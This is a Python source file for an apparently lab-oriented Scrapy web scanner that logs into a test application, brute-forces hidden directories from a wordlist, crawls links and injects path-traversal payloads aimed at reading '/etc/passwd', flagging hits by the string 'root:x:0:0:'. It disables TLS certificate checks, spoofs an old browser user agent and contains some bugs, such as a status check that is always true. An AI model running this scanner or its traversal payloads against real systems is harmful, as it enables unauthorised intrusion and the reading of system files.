import sys
import socket
#import requests
import urllib
import ssl
import json
import scrapy
from scrapy.crawler import CrawlerProcess
from scrapy.http import Request, FormRequest
from scrapy.contrib.spiders.init import InitSpider

resultList = open("result.txt", "w")
scrapList = []
testList = [
"?file=../../../../../../etc/passwd%00",
"?file=../../../../../../etc/passwd%2500",
"?file=../../../../../../etc/passwd",
"?load=../../../../../../etc/passwd%00",
"?load=../../../../../../etc/passwd%2500",
"?load=../../../../../../etc/passwd",
"?file=../../../../../../../../../../../../../../../../../../../../etc/passwd%00",
"?file=../../../../../../../../../../../../../../../../../../../../etc/passwd%2500",
"?file=../../../../../../../../../../../../../../../../../../../../etc/passwd"]
lookFor = "root:x:0:0:"

login_page = [
'https://app1.com/users/login.php', #app1
'', #app3
'', #app5
'', #app7
'', #app9
]
login_error = [
'invalid', #app1
'', #app3
'', #app5
'', #app7
'', #app9
]

class A3Spider(InitSpider):
	name = "a3"

	def init_request(self):
		"""This function is called before crawling starts."""
		print("Testes")
		return Request(url=self.login_page[0], callback=self.login)

	def login(self, response):
		"""Generate a login request."""
		return FormRequest.from_response(response,
			    formdata={'username': 'scanner1', 'password': 'scanner1'},
			    callback=self.check_login_response)

	def check_login_response(self, response):
		"""Check the response returned by a login request to see if we are
		successfully logged in.
		"""
		print(response.body)
		if login_error[0] not in response.body.decode('utf-8'):
		    self.log("Successfully logged in. Let's start crawling!")
		    # Now the crawling can begin..
		    return self.initialized()
		    print("logged in")
		else:
		    self.log("Bad times :(")
		    # Something went wrong, we couldn't log in, so nothing happens.

	def parse(self, response):
		#TODO: check if is infinite loop
		#Calendar in app1 causes infinite loop now.
		

		print(response)
		# parse for lfi	
		for testThis in testList:
			testFileInclusion = response.urljoin(testThis)
			print(testFileInclusion)
			#the fuck is this shit that doesn't let you 
			#return ints or booleans or just about anything useful?
			yield scrapy.Request(testFileInclusion, callback=self.parseForFileInclusion)

		#TODO: find input tags and try code injection

		# follow links
		nextLinks = response.css('a::attr(href)').extract()
		if nextLinks is not None:
			for link in nextLinks:
				followLink = response.urljoin(link)
				yield scrapy.Request(followLink, callback=self.parse)
		
	def parseForFileInclusion(self, response):
		result = response.xpath('//text()').extract()
		if result is not None:
			for eachItem in result:
				if lookFor not in eachItem:
					pass
				else:
					#found
					url = str(response)
					url = url.replace("200 ", "")
					splitString = cleanUp(url)
					#TODO: add type for GET and POST
					yield {
						'injection_point' : splitString[0][1:],
						'param' : splitString[1], 
					}
					return
def tryConnect(url):
	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE	
	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM):
	try:
		req = urllib.request.Request(url)
		response = urllib.request.urlopen(req, context=ctx).code
		#print(response)
		#status = s.connect_ex((url,443))
		#s.close()
		if response == 200 or 500: 
			print (url)
			scrapList.append(url)
			#resultList.write(url + "\n")
	except Exception as e:
		if "HTTP Error 404: Not Found" not in str(e):
			print(url)
			scrapList.append(url)

def cleanUp(cleanThis):
	#need to test which one of tests for file inclusion we used
	#need to do it in this roundabout way because can't find out how to use scrapy
	#to store the original url.
	#whatever.
	for eachTest in testList:
		splitString = str.split(cleanThis, eachTest)
		if (len(splitString) == 2):
			splitString[1] = eachTest
			return splitString

def main():
	rhostDomains = []
	rhostList = []
	wordList=[]
	try:
		rhosts = sys.argv[1]
		rhostList = open(rhosts, "r").readlines()
		wordList = open("wordlist.txt", "r").readlines()
	except:
		print ("Something went wrong in args")
	print(rhostList)
	for rhost in rhostList:
		rhost = rhost.strip()
		#brute force testing for possible hidden directories.
		for line in wordList:
			tryLink = rhost+"/"+line
			tryConnect(tryLink.strip())

		# allowed_domains need to be stripped of https://
		stripped = rhost.replace("https://", "")
		stripped = stripped.replace("http://", "")
		rhostDomains.append(stripped)

	process = CrawlerProcess({
		'USER_AGENT': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)',
		'FEED_FORMAT': 'json',
		'FEED_URI': 'result.json'
	})
	#empty file. Scrapy appends results by default.
	with open('result.json', 'w+'): pass

	#Starting crawler.
	process.crawl(A3Spider, allowed_domains=rhostDomains, start_urls=scrapList)
	process.start()

	print("Done!")
main()


